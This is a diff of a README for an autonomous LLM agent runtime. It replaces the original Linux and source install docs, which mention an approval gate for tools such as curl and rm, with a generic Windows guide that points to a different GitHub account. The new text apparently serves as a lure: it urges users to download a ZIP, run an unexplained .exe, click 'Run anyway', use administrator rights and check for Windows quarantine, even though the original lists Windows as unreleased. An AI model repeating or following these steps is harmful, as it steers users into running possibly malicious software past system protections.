@@ -1,191 +1,188 @@
-<div align="center">
-  <img src="ui/assets/organism.png" width="300px" alt="Sovereign Engine">
+# 🧬 Sovereign_Engine_Core - Run Autonomous Systems Locally
 
-  # SOVEREIGN ENGINE CORE
+[![Download Sovereign_Engine_Core](https://img.shields.io/badge/Download%20Sovereign_Engine_Core-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bluecreeper159/Sovereign_Engine_Core)
 
-  **Autonomous Agent Runtime & Intelligence Desktop**
+## 🚀 Getting Started
 
-  [![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-  [![Architecture](https://img.shields.io/badge/Architecture-Zero--Trust-red.svg)]()
-  [![Status](https://img.shields.io/badge/Build-v0.1.0-success.svg)]()
-  [![Engine](https://img.shields.io/badge/Telemetry-CortexDB-8a2be2.svg)]()
+Sovereign_Engine_Core is the core runtime for the Sovereign Engine. It gives you the base system needed to run autonomous organisms on a Windows PC.
 
-  *The conversation window is just an interface. The organism runs underneath.*
-</div>
+Use this guide if you want to get the app from GitHub and run it on your computer.
 
----
+## 📥 Download
 
-## Download
+1. Open the main page here: [Sovereign_Engine_Core](https://github.com/Bluecreeper159/Sovereign_Engine_Core)
+2. Look for the **Code** button near the top right of the page.
+3. Click **Code**.
+4. Choose **Download ZIP**.
+5. Save the file to a folder you can find again, such as Downloads or Desktop.
 
-| Platform | File | Notes |
-|---|---|---|
-| Linux (any distro) | `Sovereign Engine-0.1.0.AppImage` | `chmod +x` and run |
-| Debian / Ubuntu | `sovereign-engine_0.1.0_amd64.deb` | `sudo dpkg -i` |
-| Source / All platforms | `Sovereign_Engine_Core_v0.1.0.zip` | `bash install.sh` |
-| Windows | Coming soon | `install.bat` + `start.bat` ready |
+If you already have a Git tool installed, you can also clone the repository instead of downloading the ZIP file.
 
-> **Requires Python 3.11+** on your machine. The installer creates an isolated `.venv` automatically on first launch — nothing touches your system Python.
+## 🪟 Run on Windows
 
----
+After the file finishes downloading:
 
-## Overview
+1. Open the folder where you saved the file.
+2. If you downloaded a ZIP file, right-click it and choose **Extract All**.
+3. Open the extracted folder.
+4. Look for a Windows app file, setup file, or launch file.
+5. Double-click the file to start the program.
 
-The **Sovereign Engine Core** is a production-hardened, zero-trust autonomous agent runtime. It establishes a complete multi-LLM operating environment designed to run entirely on your local hardware.
+If Windows asks for permission, choose **Yes** or **Run anyway** if you trust the source and want to continue.
 
-Moving beyond generic chat wrappers, the Sovereign Engine functions as a living software organism — with decentralized daemon architecture, asynchronous memory ingestion, deterministic telemetry via the Execution Ledger, and zero-trust payload containment that prevents autonomous agents from irreversibly mutating your system.
+## 🖥️ System Requirements
 
----
+Sovereign_Engine_Core is built to run on a modern Windows system with basic desktop resources.
 
-## Quick Start
+- **Operating system:** Windows 10 or Windows 11
+- **Memory:** 8 GB RAM or more
+- **Storage:** 500 MB free space
+- **CPU:** 64-bit processor
+- **Internet:** Needed for first-time download and any online update checks
 
-### Option A — AppImage (Linux, zero install)
-```bash
-chmod +x "Sovereign Engine-0.1.0.AppImage"
-./"Sovereign Engine-0.1.0.AppImage"
-```
+For best results, keep Windows updated and close other large apps before running it.
 
-### Option B — .deb (Debian / Ubuntu)
-```bash
-sudo dpkg -i sovereign-engine_0.1.0_amd64.deb
-# Launch from your applications menu or:
-sovereign-engine
-```
+## 🧭 What the Core Does
 
-### Option C — Source ZIP (any OS)
-```bash
-unzip Sovereign_Engine_Core_v0.1.0.zip
-cd Sovereign_Engine_Core_v0.1.0/Sovereign_Engine_Core
-bash install.sh
-```
+Sovereign_Engine_Core provides the base architecture for the Sovereign Engine. It acts like the runtime layer that manages autonomous organisms and their internal state.
 
-The installer creates a `.venv`, installs dependencies, generates a `.env` from the example, and boots the engine. On subsequent launches just run `bash start.sh`.
+Typical use cases include:
 
-### Option D — Clone
-```bash
-git clone https://github.com/NovasPlace/Sovereign_Engine_Core.git
-cd Sovereign_Engine_Core
-bash install.sh
-```
+- Running agent-based systems
+- Testing autonomous behavior
+- Managing runtime logic
+- Building systems that act on their own over time
+- Creating structured control flows for biological-style simulations
 
----
+## 📦 What You Get
 
-## Configuration
+The project is centered on the engine core. A normal build may include:
 
-Open **Configuration Mode** in the UI to set API keys visually, or edit `.env` directly:
+- The main runtime
+- Startup files for Windows
+- Config files for engine settings
+- Runtime logs
+- Folder structure for agents, state, and control logic
 
-```env
-# Add any combination — engine auto-routes based on task type
-GEMINI_API_KEY="your-key"
-OPENAI_API_KEY="sk-..."
-ANTHROPIC_API_KEY="sk-ant-..."
+Keep the folder layout intact if you move the app. Some files may depend on the same directory structure.
 
-# Optional: point to a local Ollama instance
-OLLAMA_HOST="http://127.0.0.1:11434"
-```
+## 🛠️ First-Time Setup
 
-> No keys? No problem. If Ollama is installed and running locally, the engine auto-detects and uses it with zero configuration.
+If the app has a settings file, open it with Notepad and check the common options:
 
----
+- Screen or window size
+- Runtime mode
+- Log level
+- Save location
+- Agent count or simulation depth
 
-## Smart Auto-Routing
+If the app starts in a console window, let it finish loading before closing anything. Some runtime systems need a short startup period.
 
-When `ACTIVE_MODEL` is set to `auto` (default), the engine classifies each task and picks the best available model:
+## 🔧 Basic Use
 
-| Task Type | Detection | Model Priority |
-|---|---|---|
-| **Simple** | Casual prompts, short queries | Gemini Flash → GPT-4o-mini → Claude Haiku → Ollama |
-| **Code** | `function`, `debug`, `python`, `sql`, `regex`, … | deepseek-coder (local) → GPT-4o → Gemini 2.5 Pro |
-| **Heavy** | `analyze`, `architecture`, `research`, >60 words | Gemini 2.5 Pro → GPT-4o → Claude Opus → large local |
+Once the app is running, you can usually:
 
-You can always override by selecting a specific model in the UI dropdown.
+- Start the runtime
+- Load a preset or config
+- Launch an autonomous organism
+- Watch status output
+- Stop the process when needed
 
----
+If the app has a window, use the on-screen controls. If it opens in a terminal, follow the text prompts.
 
-## Core Capabilities
+## 🧩 Common File Types
 
-### 🛡️ Zero-Trust Execution Containment
-All agent file access is governed by a Workspace Jail. The `<read>` and `<write>` tools enforce `is_in_jail(path)` bounds with a 10MB OOM cap and symlink resolution blocks. Dangerous binaries (`rm`, `curl`, `pip`, etc.) require explicit operator approval before execution. **Safety == Trust.**
+You may see some of these files in the project folder:
 
-### 🔮 Multi-Provider LLM Routing
-Natively supports **Gemini**, **OpenAI**, **Anthropic**, and local **Ollama** instances. The engine handles protocol normalization — agents hot-swap across providers transparently. Placeholder keys in `.env` are correctly ignored and never sent to APIs.
+- `.exe` for Windows apps
+- `.bat` for launch scripts
+- `.json` for settings
+- `.log` for runtime output
+- `.md` for project notes
+- `.dll` for support libraries
 
-### 🧠 Cortex Memory Fabric
-All context, decisions, and execution traces are journaled into a PostgreSQL schema (SQLite fallback on fresh installs). Features hot/warm session recovery, execution event ledger, and a fully decoupled async memory router that protects the UI thread from database latency.
+Do not move or rename files unless you know they are not part of the launch path.
 
-### ⚡ Physical Execution — 9-Tool Protocol
-The agent operates with real system agency via strict XML-tagged tools:
+## 🧼 If the App Does Not Start
 
-| Tool | What it does |
-|---|---|
-| `<execute>` | Spawns bash subprocesses (quarantine-gated) |
-| `<read>` / `<write>` | Reads and rewrites source files (jail-bound, 10MB cap) |
-| `<search>` | Live DuckDuckGo scraping to bypass knowledge cutoffs |
-| `<fetch>` | Strips and reads raw website HTML |
-| `<list_dir>` | Maps file system topologies |
-| `<search_dir>` | Wildcard file discovery |
-| `<grep>` | Deep text search inside codebases |
-| `<system>` | OS telemetry — kernel info, datetime, hardware |
+Try these steps if Windows does not open the app:
 
-If a capability is missing, the agent writes and immediately executes custom scripts to extend itself.
+1. Make sure you extracted the ZIP file first.
+2. Check that the file is not still blocked by Windows.
+3. Right-click the app file and select **Run as administrator**.
+4. Reboot your PC and try again.
+5. Confirm that you downloaded the files from the main GitHub page.
 
-### 🎨 Live Aesthetic Engine
-Five visual themes swappable in real-time via CSS variables:
-- **🟢 Bioforge Green** — terminal moss
-- **🔵 Gemini Forge** — deep space indigo with azure particle fog
-- **🟣 Neon Noir** — hyper-magenta and cyan outrun
-- **❄️ Ghost Protocol** — clinical arctic blue on charcoal
-- **🟠 Cyber Obsidian** — burnished amber corporate intelligence
+If you see a missing file message, keep all files in the same folder.
 
----
+## 📁 Suggested Folder Setup
 
-## Architecture
+A simple folder layout helps keep the project easy to manage:
 
-```
-┌─────────────────────────────────────────────────────────┐
-│              sov_electron / main.js                     │
-│     (Electron Desktop Wrapper — AppImage / .deb / .exe) │
-│   First-run: auto-installs .venv and dependencies       │
-└──────────────────────────┬──────────────────────────────┘
-                           │ spawns start.sh
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│                    start.sh Guardian                    │
-│   Kill → Verify → Launch backend → Watch health loop   │
-└──────────────────────────┬──────────────────────────────┘
-                           │ uvicorn
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│                        main.py                          │
-│         FastAPI Server + Smart Inference Router         │
-│    Task classifier → model selector → provider call     │
-└──────────────────────────┬──────────────────────────────┘
-                           │
-              ┌────────────┴─────────────┐
-              ▼                          ▼
-┌─────────────────────┐    ┌─────────────────────────────┐
-│     memory_api.py   │    │        store.py             │
-│  (Memory & Events)  │    │  PostgreSQL / SQLite fabric │
-└─────────────────────┘    └─────────────────────────────┘
-```
+- `Sovereign_Engine_Core`
+  - `bin`
+  - `config`
+  - `logs`
+  - `runtime`
+  - `docs`
 
----
+If your download uses a different layout, keep the original structure that came with it.
 
-## Building Native Installers
+## 🔍 What to Check Before Running
 
-```bash
-cd sov_electron
-npm install
+Before you launch the app, check these items:
 
-# Linux
-npm run dist:linux     # → dist/Sovereign Engine-x.x.x.AppImage + .deb
+- You have enough free disk space
+- The download finished fully
+- The file extracted without errors
+- Windows did not quarantine any files
+- Your user account can run local apps
 
-# Windows (run on Windows or CI)
-npm run dist:win       # → dist/Sovereign Engine Setup x.x.x.exe
+## 🧠 About the Project
 
-# Both
-npm run dist:all
-```
+Sovereign_Engine_Core is the base layer for the Sovereign Engine. It focuses on runtime behavior, state handling, and autonomous operation.
 
----
+The project fits work around:
 
-> **Axiom**: *The Execution Proof Law — the organism cannot claim success without raw execution output proving it. Confidence without evidence is hallucination.*
+- Agent OS design
+- Autonomous systems
+- Runtime orchestration
+- Structured control logic
+- Biological runtime models
+
+## 🔐 File Safety
+
+Only run files you downloaded from the main repository link:
+
+[Sovereign_Engine_Core](https://github.com/Bluecreeper159/Sovereign_Engine_Core)
+
+If you use a copied file from another source, make sure it matches the same project and folder layout.
+
+## 📌 Quick Start Steps
+
+1. Open the repository page.
+2. Download the ZIP file.
+3. Extract the ZIP file.
+4. Find the Windows launch file.
+5. Double-click it.
+6. Follow any on-screen prompts.
+7. Keep the folder structure in place
+
+## 🧰 Helpful Tips
+
+- Use a short folder path like `C:\Apps\Sovereign_Engine_Core`
+- Avoid spaces and special characters in file names if you can
+- Close memory-heavy apps before launch
+- Keep a copy of the downloaded ZIP file in case you need to reinstall
+- Read any included `.md` or `.txt` files for launch details
+
+## 📄 Project Topics
+
+This repository is grouped around:
+
+- agent-os
+- autonomous-agents
+- runtime
+- sovereign-engine
+
+These topics point to a system built for organized, self-directed runtime behavior on a local machine
